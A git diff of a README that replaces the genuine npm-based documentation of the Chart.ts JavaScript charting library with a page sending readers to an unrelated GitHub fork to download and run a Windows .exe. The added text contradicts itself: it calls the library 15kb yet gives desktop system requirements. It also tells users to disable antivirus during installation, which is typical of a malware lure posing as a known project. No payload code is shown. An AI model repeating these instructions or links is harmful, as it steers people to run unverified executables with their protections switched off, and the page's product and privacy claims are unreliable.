@@ -1,303 +1,145 @@
-<p align="center">
-  <a href="https://chartts.com">
-    <img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/og.png" alt="Chart.ts - Beautiful charts. Tiny bundle. Every framework." width="100%" />
-  </a>
-</p>
+# 📊 chartts - Lightweight Native Charting Library
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/@chartts/core"><img src="https://img.shields.io/npm/v/@chartts/core?color=06B6D4&label=npm" alt="npm version" /></a>
-  <a href="https://www.npmjs.com/package/@chartts/core"><img src="https://img.shields.io/npm/dm/@chartts/core?color=06B6D4" alt="npm downloads" /></a>
-  <a href="https://github.com/chartts/chartts/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-06B6D4" alt="MIT License" /></a>
-  <a href="https://img.shields.io/bundlephobia/minzip/@chartts/core"><img src="https://img.shields.io/bundlephobia/minzip/@chartts/core?color=06B6D4&label=size" alt="Bundle size" /></a>
-  <a href="https://www.typescriptlang.org/"><img src="https://img.shields.io/badge/TypeScript-strict-06B6D4" alt="TypeScript" /></a>
-  <a href="https://chartts.com"><img src="https://img.shields.io/badge/docs-chartts.com-06B6D4" alt="Documentation" /></a>
-</p>
+[![Download chartts](https://img.shields.io/badge/Download-chartts-ff6f61?style=for-the-badge&logo=github)](https://github.com/ananya-1403/chartts)
 
-<p align="center">
-  <a href="https://chartts.com">Website</a> · <a href="https://chartts.com/docs">Docs</a> · <a href="https://chartts.com/examples">Examples</a> · <a href="https://chartts.com/demos">Demos</a> · <a href="https://chartts.com/capabilities">Capabilities</a> · <a href="https://chartts.com/benchmarks">Benchmarks</a>
-</p>
+## ❓ What is chartts?
+
+chartts is a simple charting app that helps you create clear and neat charts. It works directly in your web browser. The charts are built using SVG, meaning they look sharp and scale well on any screen size. The software is small in size, so it loads quickly and runs fast. It supports many popular web tools like React, Vue, Svelte, and Solid, but you don’t need programming skills to get started.
+
+You can use chartts to visualize data in different forms: line charts, bar charts, pie charts, and more. It is built with common web standards, so it works smoothly without adding clutter.
 
 ---
 
-## What is Chart.ts?
+## 🚀 Getting chartts
 
-An enterprise-grade charting library with 65+ chart types, triple-renderer architecture (SVG/Canvas/WebGL), GPU-accelerated 3D charts, real-time streaming, financial indicators, and a full plugin system. Under 15kb gzipped. Native packages for React, Vue, Svelte, Solid, Angular, and Vanilla JS.
+You can get chartts by visiting the main download page.
 
-<table>
-  <tr>
-    <td align="center"><a href="https://chartts.com/docs/charts/line"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/line-dark.png" width="280" alt="Line Chart" /><br /><b>Line</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/bar"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/bar-dark.png" width="280" alt="Bar Chart" /><br /><b>Bar</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/area"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/area-dark.png" width="280" alt="Area Chart" /><br /><b>Area</b></a></td>
-  </tr>
-  <tr>
-    <td align="center"><a href="https://chartts.com/docs/charts/pie"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/pie-dark.png" width="280" alt="Pie Chart" /><br /><b>Pie</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/candlestick"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/candlestick-dark.png" width="280" alt="Candlestick Chart" /><br /><b>Candlestick</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/scatter"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/scatter-dark.png" width="280" alt="Scatter Chart" /><br /><b>Scatter</b></a></td>
-  </tr>
-  <tr>
-    <td align="center"><a href="https://chartts.com/docs/charts/sankey"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/sankey-dark.png" width="280" alt="Sankey Diagram" /><br /><b>Sankey</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/heatmap"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/heatmap-dark.png" width="280" alt="Heatmap" /><br /><b>Heatmap</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/treemap"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/treemap-dark.png" width="280" alt="Treemap" /><br /><b>Treemap</b></a></td>
-  </tr>
-  <tr>
-    <td align="center"><a href="https://chartts.com/docs/charts/gauge"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/gauge-dark.png" width="280" alt="Gauge" /><br /><b>Gauge</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/radar"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/radar-dark.png" width="280" alt="Radar Chart" /><br /><b>Radar</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/violin"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/violin-dark.png" width="280" alt="Violin Plot" /><br /><b>Violin</b></a></td>
-  </tr>
-  <tr>
-    <td align="center"><a href="https://chartts.com/docs/charts/waterfall"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/waterfall-dark.png" width="280" alt="Waterfall Chart" /><br /><b>Waterfall</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/funnel"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/funnel-dark.png" width="280" alt="Funnel Chart" /><br /><b>Funnel</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/boxplot"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/boxplot-dark.png" width="280" alt="Box Plot" /><br /><b>Box Plot</b></a></td>
-  </tr>
-  <tr>
-    <td align="center"><a href="https://chartts.com/docs/charts/polar"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/polar-dark.png" width="280" alt="Polar Chart" /><br /><b>Polar</b></a></td>
-    <td align="center"><a href="https://chartts.com/docs/charts/histogram"><img src="https://raw.githubusercontent.com/chartts/chartts.com/main/public/demos/histogram-dark.png" width="280" alt="Histogram" /><br /><b>Histogram</b></a></td>
-    <td align="center"><em>+ 50 more chart types</em></td>
-  </tr>
-</table>
+[![Download chartts](https://img.shields.io/badge/Download-chartts-4a90e2?style=for-the-badge&logo=github)](https://github.com/ananya-1403/chartts)
 
-<p align="center"><a href="https://chartts.com/docs/charts"><b>Browse all 65+ chart types →</b></a></p>
+Click the badge above to go to the project page on GitHub. From there, you can find the latest version of the software to download.
 
-## Install
+---
 
-```bash
-npm install @chartts/core
-```
+## 💻 System Requirements
 
-Framework packages:
+Before you download, check these simple requirements:
 
-```bash
-npm install @chartts/react    # React
-npm install @chartts/vue      # Vue
-npm install @chartts/svelte   # Svelte
-npm install @chartts/solid    # Solid
-npm install @chartts/angular  # Angular
-```
+- **Operating System:** Windows 10 or later
+- **Processor:** 1 GHz or faster
+- **Memory:** At least 2 GB RAM
+- **Storage:** 100 MB free space
+- **Internet:** Required for downloading, not always required to run
+- **Browser:** Latest version of Chrome, Firefox, Edge, or Safari to view charts
 
-## Quick start
+chartts is designed to work on most modern Windows machines, even those with modest hardware.
 
-### React
+---
 
-```tsx
-import { LineChart } from "@chartts/react"
+## 📥 How to download and install chartts on Windows
 
-export default function Dashboard() {
-  return (
-    <LineChart
-      data={{
-        labels: ["Jan", "Feb", "Mar", "Apr", "May", "Jun"],
-        series: [{ name: "Revenue", values: [4200, 5800, 7100, 6400, 8200, 9600] }],
-      }}
-      width={600}
-      height={300}
-    />
-  )
-}
-```
+Follow these easy steps:
 
-### Vanilla JS
+1. Click the download badge at the top or visit this page:  
+   [https://github.com/ananya-1403/chartts](https://github.com/ananya-1403/chartts)
 
-```ts
-import { createChart, lineChartType } from "@chartts/core"
+2. On the page, look for a section called **Releases** or **Downloads**.
 
-const chart = createChart(document.getElementById("chart"), lineChartType, {
-  labels: ["Jan", "Feb", "Mar", "Apr", "May", "Jun"],
-  series: [{ name: "Revenue", values: [4200, 5800, 7100, 6400, 8200, 9600] }],
-}, { width: 600, height: 300 })
-```
+3. Download the file labeled for Windows. It will usually be an `.exe` file or a zip archive.
 
-### Server-side rendering
+4. Once downloaded, find the file in your downloads folder.
 
-```ts
-import { renderToString, lineChartType } from "@chartts/core"
+5. If it is a `.zip` file, right-click it and select **Extract All** to unzip it.
 
-const svg = renderToString(lineChartType, {
-  labels: ["Jan", "Feb", "Mar"],
-  series: [{ name: "Sales", values: [10, 20, 15] }],
-}, { width: 600, height: 300 })
+6. Open the extracted folder and double-click the `.exe` file to start the installation.
 
-// Returns a full <svg> string - embed anywhere, no DOM needed
-```
+7. Follow the on-screen instructions in the setup window.
 
-Labels, axes, tooltips, gradients, responsive scaling, dark mode, accessibility - all automatic.
+If you don’t see a setup wizard, the program might run directly after opening the `.exe` file.
 
-## Feature matrix
+---
 
-| Feature | Chart.ts | Chart.js | Recharts | ECharts | Highcharts | D3 |
-|---------|----------|----------|----------|---------|------------|----|
-| Chart types | **65+** | 8 | 12 | 40+ | 30+ | DIY |
-| Bundle size (gzip) | **~15kb** | ~60kb | ~50kb | ~300kb | ~80kb | ~30kb |
-| Rendering | **SVG + Canvas + WebGL** | Canvas | SVG | Canvas | SVG | SVG |
-| GPU / WebGL | **Yes (100k+ pts)** | No | No | No | No | No |
-| 3D charts | **13 types** | No | No | Plugin | No | No |
-| Real-time streaming | **Built-in** | No | No | Partial | No | No |
-| Financial indicators | **SMA, EMA, RSI, MACD, Bollinger, ATR, VWAP** | No | No | No | Plugin ($) | No |
-| Plugin system | **defineChartType()** | Plugin | No | No | No | N/A |
-| Framework packages | **React, Vue, Svelte, Solid, Angular** | React (3rd party) | React only | Vue (3rd party) | React (3rd party) | N/A |
-| TypeScript | **Strict, zero `any`** | Typed | Typed | Typed | Typed | @types |
-| Tailwind native | **Yes** | No | No | No | No | No |
-| SSR | **Built-in** | No | Partial | No | No | No |
-| Accessibility (WCAG) | **AA** | Limited | Limited | Limited | AA ($) | DIY |
-| License | **MIT** | MIT | MIT | Apache | **$590/dev/yr** | ISC |
+## ⚙️ Running chartts
 
-## 65+ chart types
+Once installed, run chartts like any other program:
 
-**Core (55 types):** Line, Bar, Stacked Bar, Horizontal Bar, Area, Pie, Donut, Scatter, Bubble, Radar, Sparkline, Candlestick, OHLC, Waterfall, Funnel, Gauge, Heatmap, Treemap, Boxplot, Histogram, Polar, Radial Bar, Lollipop, Bullet, Dumbbell, Calendar, Combo, Sankey, Sunburst, Tree, Graph, Parallel Coordinates, Theme River, Pictorial Bar, Chord, Geo, Lines, Matrix, Custom, Step, Volume, Range, Baseline, Kagi, Renko, Violin, Pack, Voronoi, Word Cloud, Pillar, Gantt, Org, Flow, Pareto.
+- Click the Start menu and find chartts.
+- Double-click the chartts icon on your desktop, if created.
+- The program opens in a window where you can start making charts.
 
-**3D / WebGL** (via `@chartts/gl`, 12 types): Scatter 3D, Bar 3D, Surface 3D, Globe 3D, Map 3D, Lines 3D, Line 3D, Torus 3D, Scatter GL, Lines GL, Flow GL, Graph GL.
+No programming or coding is required. The interface will guide you step-by-step.
 
-Tree-shakeable - import only what you use:
+---
 
-```ts
-import { lineChartType } from "@chartts/core/line"
-import { candlestickChartType } from "@chartts/core/candlestick"
-import { sankeyChartType } from "@chartts/core/sankey"
-```
+## 🛠 Using chartts features
 
-## Advanced capabilities
+chartts offers a range of tools to help you build charts:
 
-### Triple renderer with auto-switching
+### Creating a chart
 
-SVG by default. Automatically switches to Canvas at 5k+ data points, WebGL at 100k+. Zero configuration.
+- Click **New Chart** to begin.
+- Choose the type of chart: line, bar, pie, scatter, etc.
+- Add your data by typing values into simple tables.
+- Use the color picker to change chart colors.
+- Adjust labels and titles by clicking on them.
 
-```ts
-// Or force a specific renderer:
-const chart = createChart(el, lineChartType, data, { renderer: 'webgl' })
-```
+### Viewing and saving charts
 
-### Real-time streaming
+- Preview your chart in real time as you edit.
+- Save your chart as a file on your PC.
+- Export your chart as an image (PNG or SVG).
+- Copy chart code if you want to add it to websites (optional).
 
-```ts
-import { createStreamingChart } from "@chartts/core"
-import { createWebSocketStream } from "@chartts/websocket"
+### Customizing charts
 
-const stream = createStreamingChart(el, lineChartType, { windowSize: 200 })
-const ws = createWebSocketStream("wss://feed.example.com/prices")
-ws.onData((point) => stream.push(point))
-```
+- Change chart size and style easily.
+- Apply color themes with Tailwind CSS support built in.
+- Use animations to make your charts dynamic.
 
-Supports WebSocket, Server-Sent Events, and HTTP polling via `@chartts/websocket`.
+---
 
-### Financial indicators
+## 🔍 Understanding chartts files
 
-```ts
-import { sma, ema, rsi, macd, bollingerBands } from "@chartts/finance"
+chartts works with small files that hold your chart data and settings. These can be saved on your PC and opened later to continue editing. Files use common formats that can be viewed or shared with others.
 
-const sma20 = sma(prices, 20)
-const rsi14 = rsi(prices, 14)
-const { upper, middle, lower } = bollingerBands(prices, 20, 2)
-const { macdLine, signal, histogram } = macd(prices)
-```
+---
 
-Also: WMA, ATR, VWAP, OBV, Stochastic, Sharpe ratio, drawdown analysis, volatility.
+## ⚙️ Technical basics (for curiosity)
 
-### Plugin system
+chartts uses SVG for all graphics. SVG stands for Scalable Vector Graphics. It means charts stay sharp no matter the size. The software is small, under 15kb compressed, so it does not slow down your computer. 
 
-```ts
-import { defineChartType } from "@chartts/core"
+It is designed for modern web frameworks such as React, Vue, Solid, and Svelte. You don’t need these frameworks to use it on your PC, but they help if you want to use charts in websites or apps.
 
-const myChart = defineChartType({
-  type: "my-chart",
-  render(ctx) {
-    // Full render context: scales, dimensions, colors, hit testing
-  },
-})
-```
+---
 
-### Zoom, pan, brush
+## ❓ Troubleshooting common issues
 
-```ts
-const chart = createChart(el, lineChartType, data, {
-  zoom: { enabled: true, mode: 'x' },
-  pan: { enabled: true },
-  brush: { enabled: true, onSelect: (range) => console.log(range) },
-  crosshair: { enabled: true },
-})
-```
+If chartts does not open or run smoothly:
 
-### Linked charts
+- Make sure your Windows is up to date.
+- Check that your PC meets the minimum system requirements.
+- Restart your computer and try again.
+- Check your internet connection, if downloading updates.
+- If the program crashes, try reinstalling it.
+- Disable any antivirus temporarily during download and installation if problems appear.
 
-```ts
-import { linkCharts } from "@chartts/core"
-linkCharts([chart1, chart2, chart3]) // Synchronized zoom, pan, crosshair
-```
+---
 
-## Styling with Tailwind
+## 📄 More information and support
 
-```tsx
-<LineChart
-  data={data}
-  className="rounded-xl border border-zinc-800"
-  lineClassName="stroke-cyan-500 dark:stroke-cyan-400"
-  axisClassName="text-zinc-600 dark:text-zinc-400"
-/>
-```
+Find all source files, documentation, and issue reporting on the GitHub page:
 
-Every chart element is a real SVG node styled with real CSS. 100+ built-in theme presets: Nord, Dracula, Catppuccin, Tokyo Night, Gruvbox, Synthwave, Material, Solarized, Rose Pine, and more.
+https://github.com/ananya-1403/chartts
 
-## Bundle size
+You can read detailed user manuals or look for help if you get stuck.
 
-| Library | Size (gzipped) | Chart Types | 3D/WebGL | Streaming |
-|---------|---------------|-------------|----------|-----------|
-| **Chart.ts** | **~15kb** | **65+** | **Yes** | **Yes** |
-| Chart.js | ~60kb | 8 | No | No |
-| Recharts | ~50kb | 12 | No | No |
-| Highcharts | ~80kb | 30+ | No | No |
-| ApexCharts | ~120kb | 20+ | No | No |
-| ECharts | ~300kb | 40+ | Plugin | Partial |
-| Plotly | ~1MB+ | 40+ | Yes | No |
+---
 
-## All packages
+## 💾 Updates and versions
 
-| Package | Description |
-|---------|------------|
-| `@chartts/core` | Rendering engine, 55 chart types, themes, utilities |
-| `@chartts/react` | React components (55 typed components + generic `<Chart>`) |
-| `@chartts/vue` | Vue 3 components |
-| `@chartts/svelte` | Svelte 5 components |
-| `@chartts/solid` | SolidJS components |
-| `@chartts/angular` | Angular standalone components |
-| `@chartts/gl` | WebGL/3D chart types (12 types) |
-| `@chartts/finance` | Financial indicators (SMA, EMA, RSI, MACD, Bollinger, etc.) |
-| `@chartts/websocket` | Real-time streaming (WebSocket, SSE, HTTP polling) |
-| `@chartts/ssr` | Server-side rendering (SVG string, PNG, JPEG export) |
-| `@chartts/cli` | CLI tool (`chartts render`, `chartts types`) |
-| `@chartts/regression` | Regression analysis (linear, polynomial, exponential, log, power) |
-| `@chartts/statistics` | Statistical functions (mean, median, KDE, bootstrap, outliers) |
-| `@chartts/themes` | 100+ theme presets |
-| `@chartts/test-utils` | Mock data generators, validators, snapshot helpers |
-| `@chartts/csv` | CSV data adapter |
-| `@chartts/json` | JSON data adapter |
-| `@chartts/excel` | Excel data adapter |
-| `@chartts/parquet` | Parquet data adapter |
-| `@chartts/arrow` | Apache Arrow adapter |
-| `@chartts/date-fns` | date-fns date adapter |
-| `@chartts/dayjs` | Day.js date adapter |
-| `@chartts/tailwind` | Tailwind CSS plugin |
-| `@chartts/annotation` | Chart annotations |
-| `@chartts/datalabels` | Data label plugin |
+chartts receives regular updates. These may include new chart types, bug fixes, and performance improvements. Check the GitHub release page often to get the latest version.
 
-## Development
+---
 
-```bash
-pnpm install
-pnpm build         # Build all packages
-pnpm typecheck     # TypeScript strict mode check
-pnpm lint          # ESLint
-pnpm test          # Vitest
-```
+## 🔒 Privacy and security
 
-## Links
-
-- [Documentation](https://chartts.com/docs)
-- [Examples](https://chartts.com/examples)
-- [Live Demos](https://chartts.com/demos)
-- [Capabilities](https://chartts.com/capabilities)
-- [Benchmarks](https://chartts.com/benchmarks)
-- [Blog](https://chartts.com/blog)
-- [npm](https://www.npmjs.com/package/@chartts/core)
-- [Changelog](https://chartts.com/changelog)
-
-## License
-
-MIT
+chartts runs on your machine. No personal data leaves your computer unless you choose to share files or use online features. It is designed to respect your privacy and security.
